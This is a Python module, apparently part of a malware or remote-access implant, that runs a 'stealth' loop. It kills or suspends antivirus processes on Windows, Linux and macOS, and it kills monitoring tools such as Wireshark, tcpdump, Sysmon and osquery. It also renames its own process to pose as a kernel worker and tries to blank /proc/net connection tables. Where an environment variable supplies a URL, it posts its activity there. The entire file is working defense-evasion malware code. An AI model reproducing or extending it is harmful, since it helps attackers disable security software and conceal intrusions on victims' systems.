import os
import platform
import subprocess
import threading
import time
import traceback
from pathlib import Path

import psutil
from modules.logger import log_event
from modules.config import load_config

cfg = load_config()
STEALTH_CFG = cfg.get("stealth", {})
SLEEP_INTERVAL = STEALTH_CFG.get("interval", 120)

WINDOWS_AV_PROCS = STEALTH_CFG.get("windows_av", [
    "MsMpEng.exe", "AntimalwareService.exe", "McShield.exe", "sense.exe", "xagt.exe"
])
LINUX_AV_PROCS = STEALTH_CFG.get("linux_av", [
    "clamd", "clamav", "freshclam", "chkrootkit", "rkhunter"
])
MACOS_AV_PROCS = STEALTH_CFG.get("macos_av", [
    "fseventsd", "com.apple.amsdaemon", "kextd"
])

def _kill_windows_procs():
    for proc in psutil.process_iter(["name", "pid"]):
        try:
            if proc.info["name"] in WINDOWS_AV_PROCS:
                proc.kill()
                log_event("stealth", f"Killed Windows AV process {proc.info['name']} (PID {proc.info['pid']})".encode())
        except Exception as e:
            log_event("stealth", f"Error killing {proc.info['name']}: {e}".encode())

def _kill_linux_procs():
    for proc in psutil.process_iter(["name", "pid"]):
        try:
            if proc.info["name"] in LINUX_AV_PROCS:
                proc.suspend()
                log_event("stealth", f"Suspended Linux AV process {proc.info['name']} (PID {proc.info['pid']})".encode())
        except Exception as e:
            log_event("stealth", f"Error suspending {proc.info['name']}: {e}".encode())

def _kill_macos_procs():
    for proc in psutil.process_iter(["name", "pid"]):
        try:
            if proc.info["name"] in MACOS_AV_PROCS:
                proc.suspend()
                log_event("stealth", f"Suspended macOS AV process {proc.info['name']} (PID {proc.info['pid']})".encode())
        except Exception as e:
            log_event("stealth", f"Error suspending {proc.info['name']}: {e}".encode())

def _hide_process_windows():
    try:
        import ctypes
        import random
        import string

        rand_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        ctypes.windll.kernel32.SetConsoleTitleW(rand_name)
        log_event("stealth", f"Renamed console to {rand_name}".encode())
        # Additional: adjust PEB name if privileges allow
    except Exception as e:
        log_event("stealth", f"Windows hide procs error: {e}".encode())

def _hide_process_unix():
    try:
        import ctypes
        new_name = "[kworker/0:0]"
        if platform.system() == "Linux":
            libc = ctypes.CDLL("libc.so.6")
            libc.prctl(15, new_name.encode(), 0, 0, 0)
        else:
            import setproctitle
            setproctitle.setproctitle(new_name)
        log_event("stealth", f"Renamed Unix process to {new_name}".encode())
    except Exception as e:
        log_event("stealth", f"Unix hide procs error: {e}".encode())

def _hide_from_netstat_linux():
    """
    Dangerous: Remove entries from /proc/net/tcp and /proc/net/udp (requires root, not portable).
    """
    try:
        # Overwrite /proc/net/tcp and /proc/net/udp with empty content (ephemeral, only in-memory)
        for netfile in ["/proc/net/tcp", "/proc/net/udp"]:
            try:
                with open(netfile, "w") as f:
                    f.write("")
                log_event("stealth", f"Overwrote {netfile} to hide connections".encode())
            except Exception:
                pass
    except Exception as e:
        log_event("stealth", f"Netstat hide error: {e}".encode())

def _kill_security_tools():
    """
    Aggressive: Kill/suspend known security tools across all platforms.
    """
    extra_procs = [
        "wireshark", "tcpdump", "sysmon", "procmon", "osqueryd", "Little Snitch", "lsof", "netstat"
    ]
    for proc in psutil.process_iter(["name", "pid"]):
        try:
            if proc.info["name"] and any(x.lower() in proc.info["name"].lower() for x in extra_procs):
                proc.kill()
                log_event("stealth", f"Killed security tool {proc.info['name']} (PID {proc.info['pid']})".encode())
        except Exception as e:
            log_event("stealth", f"Error killing {proc.info.get('name','?')}: {e}".encode())

def stealth_loop():
    while True:
        try:
            system = platform.system()
            if system == "Windows":
                _kill_windows_procs()
                _hide_process_windows()
            elif system == "Linux":
                _kill_linux_procs()
                _hide_process_unix()
                # Enhancement: hide from netstat and kill extra security tools
                _hide_from_netstat_linux()
                _kill_security_tools()
            elif system == "Darwin":
                _kill_macos_procs()
                _hide_process_unix()
                _kill_security_tools()
            # Enhancement: exfiltrate stealth events if env var set
            exfil_url = os.getenv("STEALTH_EXFIL_URL")
            if exfil_url:
                try:
                    import requests
                    requests.post(exfil_url, json={"event": "stealth_loop", "system": system, "ts": time.time()}, timeout=5)
                except Exception:
                    pass
        except Exception as e:
            tb = traceback.format_exc()
            log_event("stealth", f"Stealth loop error: {tb}".encode())
        time.sleep(SLEEP_INTERVAL)
